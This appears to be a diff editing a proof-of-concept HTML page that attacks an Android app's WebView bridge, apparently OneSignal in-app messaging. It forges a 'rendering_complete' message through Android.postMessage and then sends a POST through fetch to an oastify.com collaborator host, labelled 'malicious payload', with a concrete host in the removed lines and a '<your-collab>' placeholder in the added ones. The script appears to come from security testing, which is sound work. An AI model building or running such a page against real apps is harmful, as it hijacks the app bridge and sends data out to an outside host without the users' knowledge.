@@ -1,21 +1,24 @@
-<!DOCTYPE html><html><body><h1>Test</h1></body></html>
-
 <!DOCTYPE html>
 <html>
 <head>
-  <title>PoC</title>
+  <title>PoC - Full JSON</title>
   <script>
     window.onload = function () {
-      // Satisfy app's WebView expected message
+      // satisfy OneSignal WebView expectations
       if (window.Android && Android.postMessage) {
-        Android.postMessage(JSON.stringify({ type: "rendering_complete" }));
-      }
+        Android.postMessage(JSON.stringify({
+          type: "rendering_complete",
+          displayLocation: "FULL_SCREEN",  // <- critical
+          pageHeight: 500,                 // <- likely expected
+          dragToDismissDisabled: false     // <- not always required, but safe to include
+        }));
 
-      // Actual payload
-      fetch("https://lc1916d93ukb2jltez6vo02fn6txhp5e.oastify.com", {
-        method: "POST",
-        body: JSON.stringify({ leak: "poison" })
-      });
+        // malicious payload
+        fetch("https://<your-collab>.oastify.com", {
+          method: "POST",
+          body: JSON.stringify({ exfil: "true" })
+        });
+      }
     };
   </script>
 </head>
